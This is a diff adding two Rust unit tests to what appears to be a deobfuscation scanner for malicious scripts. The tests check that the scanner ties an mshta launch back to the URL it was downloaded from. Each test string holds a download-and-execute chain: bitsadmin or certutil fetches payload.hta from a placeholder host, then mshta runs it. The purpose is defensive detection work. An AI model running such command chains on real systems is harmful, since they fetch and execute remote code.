@@ -16321,6 +16321,27 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn bitsadmin_downloaded_hta_in_deob_text_resolves_mshta_source_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            "bitsadmin /transfer j1 /download https://bits-mshta.example/payload.hta C:\\Temp\\payload.hta\r\nmshta C:\\Temp\\payload.hta",
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta C:\\Temp\\payload.hta"
+                            && url == "https://bits-mshta.example/payload.hta"
+                )
+            }),
+            "bitsadmin-downloaded HTA in deob text was not linked to mshta: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_requests_get_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -19494,6 +19515,27 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
         assert!(
             has,
             "schemeless certutil deob-text source was not structured: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certutil_downloaded_hta_in_deob_text_resolves_mshta_source_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            "certutil -urlcache -split -f https://certutil-mshta.example/payload.hta C:\\Temp\\payload.hta\r\nmshta C:\\Temp\\payload.hta",
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta C:\\Temp\\payload.hta"
+                            && url == "https://certutil-mshta.example/payload.hta"
+                )
+            }),
+            "certutil-downloaded HTA in deob text was not linked to mshta: {:?}",
             env.traits
         );
     }
